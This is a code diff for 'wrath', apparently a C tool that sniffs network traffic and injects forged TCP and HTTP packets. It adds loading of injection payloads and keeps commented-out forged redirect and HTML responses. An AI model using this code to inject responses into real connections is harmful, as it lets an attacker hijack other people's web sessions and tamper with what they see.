@@ -4,7 +4,7 @@
 #include "wrath-utils.h"
 #include "wrath-applevel.h"
 
-void wrath_build_and_launch(u_char *, const u_char *, struct inject_package *);
+void wrath_build_and_launch(u_char *, const u_char *, u_char *);
 
 void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
 	struct lcp_package *package = (struct lcp_package *) args;
@@ -21,9 +21,15 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	   
 	   if an operation does not exist only pass null pointer.
 	*/
-	if (strcmp(cline_args->input_file) != "\0") // If an input file has been specified
-		app_cmd = fopen(cline_args->input_file, "r");
-	else if (strcmp(cline_args->command) != "\0") // If a command has been specified but not an input file
+	if (strcmp(cline_args->input_file, "\0") != 0) { // If an input file has been specified
+		int app_fd, length;
+		app_fd = open(cline_args->input_file, O_RDONLY, 0);
+		if ((length = file_size(app_fd)) == -1)
+			fatal_error("getting file size");
+		unsigned char *ptr = (unsigned char *) safe_malloc(length);
+		read(app_fd, ptr, length);
+		app_cmd = ptr;
+	} else if (strcmp(cline_args->command, "\0") != 0) // If a command has been specified but not an input file
 		app_cmd = cline_args->command;
 
 	/* looks to see if an operation is set.
@@ -32,17 +38,17 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	 * protocol */
 	char *op = cline_args->operation;
 	if (strcmp(op, "http") == 0 || strcmp(op, "HTTP") == 0 ) {
-		wrath_http_nltocr(app_cmd);
+		//wrath_http_nltocr(app_cmd);
 		if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
 			printf("HTTP Packet sniffed\n");
-			wrath_build_and_launch(args, packet, &inject_pack);	
+			wrath_build_and_launch(args, packet, app_cmd);	
 		}
 	// else if (strcmp(op, "ftp") == 0 || strcmp(op, "FTP") == 0)
 	} else if (strcmp(op, "\0") == 0 || strcmp (op, "tcp") == 0 || strcmp(op, "TCP") == 0) // TCP is default
 			wrath_build_and_launch(args, packet, NULL);	
 }
 
-void wrath_build_and_launch(u_char *args, const u_char *packet, struct inject_package *i_pack) {
+void wrath_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload) {
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
@@ -50,13 +56,6 @@ void wrath_build_and_launch(u_char *args, const u_char *packet, struct inject_pa
 	struct libnet_ipv4_hdr *iphdr;
 	struct libnet_tcp_hdr *tcphdr;
 
-	/*
-	char *payload;
-	if (strcmp(cline_args->command, "\0") != 0) {
-		payload = cline_args->command;
-	}
-	else {
-	*/
 	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://ada.evergreen.edu/~stenic05\r\n\r\n";
 	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://en.wikipedia.org/wiki/Tupac_Shakur\r\n\r\n";
 	//char payload[] = "HTTP/1.1 200 OK\r\nServer: WRATH\r\nConnection: close\r\nContent-Type: text/html; charset=utf-8\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n<html><img src=\"http://3.bp.blogspot.com/-Lz-g9K2Mc8A/UH-YAgdMRJI/AAAAAAAALoI/45KMc_bLRFc/s1600/papa_murphys_jack-o-lantern_pizza.jpg\"/></html>";
